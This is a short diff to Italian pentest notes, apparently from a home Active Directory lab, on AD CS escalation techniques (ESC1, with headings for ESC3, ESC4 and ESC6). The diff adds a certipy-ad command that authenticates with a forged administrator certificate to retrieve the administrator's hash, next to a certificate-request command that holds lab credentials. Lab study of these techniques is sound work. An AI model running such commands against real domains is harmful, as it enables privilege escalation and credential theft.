@@ -241,8 +241,9 @@ certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -templ
 ![[Pasted image 20230828150815.png]]
 Ora usando il suo certificato prendi l'hash
 ```bash
-
+certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
 ```
+![[Pasted image 20230828150913.png]]
 ### **ESC 3 - ADCS**
 ### **ESC 4 - ADCS**
 ### **ESC 6 - ADCS**
